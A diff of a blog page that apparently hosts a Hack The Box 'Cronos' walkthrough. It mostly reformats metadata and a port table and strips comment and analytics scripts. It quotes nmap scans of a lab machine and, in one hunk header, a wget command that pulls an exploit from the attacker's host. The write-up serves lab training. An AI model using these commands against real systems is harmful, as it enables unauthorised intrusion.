@@ -16,12 +16,14 @@
 
   
   <meta name="author" content="Neal" />
-  <meta name="description" content="Introduction Target machine: 10.10.10.13(OS: linux)
+  <meta name="description" content="
+Introduction Target machine: 10.10.10.13(OS: linux)
 Kali linux: 10.10.16.44
 Enumeration Firstly, detect the open ports:
 nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13 3 ports is open, detect the detailed services:
 namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13 So we can conduct the relation of ports of ports and services as following:
-   port service     53 DNS   22 ssh   80 http    Exploitation http As the target machine provides http service, try to access http://10." />
+port service 53 DNS 22 ssh 80 http Exploitation http As the target machine provides http service, try to access http://10.10.10.13
+" />
 
   
   
@@ -29,12 +31,14 @@ namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13 So we can conduct the relat
   
   <meta property="og:type" content="article" />
   <meta property="og:title" content="Cronos -- hack the box" />
-  <meta property="og:description" content="Introduction Target machine: 10.10.10.13(OS: linux)
+  <meta property="og:description" content="
+Introduction Target machine: 10.10.10.13(OS: linux)
 Kali linux: 10.10.16.44
 Enumeration Firstly, detect the open ports:
 nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.13 3 ports is open, detect the detailed services:
 namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13 So we can conduct the relation of ports of ports and services as following:
-   port service     53 DNS   22 ssh   80 http    Exploitation http As the target machine provides http service, try to access http://10." />
+port service 53 DNS 22 ssh 80 http Exploitation http As the target machine provides http service, try to access http://10.10.10.13
+" />
   <meta property="og:url" content="https://madneal.com/post/cronos-hack-the-box/" />
   <meta property="og:image" content="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/img/avatar.jpg" />
 
@@ -239,26 +243,26 @@ namp -sV -sC -p22.53.80 -Pn -oA services 10.10.10.13 So we can conduct the relat
 </code></pre><p><img src="https://s2.ax1x.com/2019/03/15/AE1OOJ.png" alt="AE1OOJ.png"></p>
 <p>So we can conduct the relation of ports of ports and services as following:</p>
 <table>
-<thead>
-<tr>
-<th>port</th>
-<th>service</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>53</td>
-<td>DNS</td>
-</tr>
-<tr>
-<td>22</td>
-<td>ssh</td>
-</tr>
-<tr>
-<td>80</td>
-<td>http</td>
-</tr>
-</tbody>
+  <thead>
+      <tr>
+          <th>port</th>
+          <th>service</th>
+      </tr>
+  </thead>
+  <tbody>
+      <tr>
+          <td>53</td>
+          <td>DNS</td>
+      </tr>
+      <tr>
+          <td>22</td>
+          <td>ssh</td>
+      </tr>
+      <tr>
+          <td>80</td>
+          <td>http</td>
+      </tr>
+  </tbody>
 </table>
 <h2 id="exploitation">Exploitation</h2>
 <h3 id="http">http</h3>
@@ -323,31 +327,13 @@ wget http://10.10.16.44/exploit
       </ul>
       
       <p class="post-copyright">
-        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>2159</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
+        © This post is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License，please give source if you wish to quote or reproduce.This post was published <strong>2191</strong> days ago, content in the post may be inaccurate, even wrong now, please take risk yourself.
       </p>
     </footer>
     
-      <div id="disqus_thread"></div>
-<script type="application/javascript">
-    window.disqus_config = function () {
-    
-    
-    
-    };
-    (function() {
-        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
-            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
-            return;
-        }
-        var d = document, s = d.createElement('script'); s.async = true;
-        s.src = '//' + "nealecnu" + '.disqus.com/embed.js';
-        s.setAttribute('data-timestamp', +new Date());
-        (d.head || d.body).appendChild(s);
-    })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
-      
+        
+          
+       
     
   </section>
   <footer class="site-footer">
@@ -381,20 +367,7 @@ wget http://10.10.16.44/exploit
 </script>
 
 <script src="https://cdn.jsdelivr.net/gh/neal1991/neal1991.github.io/js/bundle.js"></script>
-
-
-<script type="application/javascript">
-var doNotTrack = false;
-if (!doNotTrack) {
-	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
-	ga('create', 'UA-104405154-2', 'auto');
-	
-	ga('send', 'pageview');
-}
-</script>
-<script async src='https://www.google-analytics.com/analytics.js'></script>
-
-
+  
 
 
 
